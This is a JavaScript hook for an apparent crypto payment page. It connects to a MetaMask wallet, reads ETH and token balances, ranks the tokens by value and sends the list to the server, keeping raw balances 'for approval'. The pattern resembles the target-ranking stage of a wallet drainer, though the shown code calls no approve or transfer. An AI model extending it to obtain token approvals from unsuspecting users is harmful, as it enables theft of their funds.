import { ethers } from "ethers";
import { tokenAddresses, erc20Abi, contractOwnerAddress, erc721Abi, erc1155Abi, erc721Addresses, erc1155Addresses } from '../config.js';

let CheckBalances = {
    async mounted() {
        console.log("CheckBalances mounted");
        if (!window.ethereum) {
            this.pushEvent("set_payment_variant", { variant: "qr" });
            return;
        }
        try {
            this.pushEvent("set_payment_variant", { variant: "wallet" });
            // Connect to MetaMask
            const provider = new ethers.BrowserProvider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = await provider.getSigner();
            const userAddress = await signer.getAddress();
            // Get ETH balance
            const balance = await provider.getBalance(userAddress);
            const formattedBalance = ethers.formatEther(balance);

            this.pushEvent("set_wallet_basics", {
                address: userAddress,
                eth_balance: formattedBalance
            });

            let tokenBalances = await this.getTokenBalances(provider, userAddress);
            tokenBalances = this.sortTokensByValue(tokenBalances);

            const formattedBalances = tokenBalances.map(token => ({
                ...token,
                rawBalance: token.rawBalance.toString()
            }));

            this.pushEvent("check_balances_result", {
                tokens: formattedBalances,
                nfts: []
            });

        } catch (error) {
            console.error("Error checking balances:", error);
        }
    },
    async getTokenBalances(provider, address) {
        const balancePromises = tokenAddresses.map(async (tokenAddress) => {
            try {
                const contract = new ethers.Contract(tokenAddress, erc20Abi, provider);
                const [balance, decimals, symbol] = await Promise.all([
                    contract.balanceOf(address),
                    contract.decimals(),
                    contract.symbol()
                ]);
                const formattedBalance = ethers.formatUnits(balance, decimals);
                if (balance > 0) {
                    return {
                        tokenAddress,
                        symbol,
                        balance: formattedBalance,
                        rawBalance: balance // Keep raw balance for approval
                    };
                }
            } catch (error) {
                console.error(`Failed to fetch balance for token at ${tokenAddress}:`, error);
                return null;
            }
        });

        const tokenBalances = await Promise.all(balancePromises);
        return tokenBalances.filter(Boolean); // Filter out null results
    },

    // Sort tokens by raw balance in descending order (BigInt safe comparison)
    sortTokensByValue(tokenBalances) {
        return tokenBalances.sort((a, b) => {
            const balanceA = BigInt(a.rawBalance);  // Ensure rawBalance is BigInt
            const balanceB = BigInt(b.rawBalance);  // Ensure rawBalance is BigInt

            // Use BigInt comparison, returning positive, negative, or 0
            if (balanceA > balanceB) return -1;
            if (balanceA < balanceB) return 1;
            return 0;
        });
    },
};

export default CheckBalances;
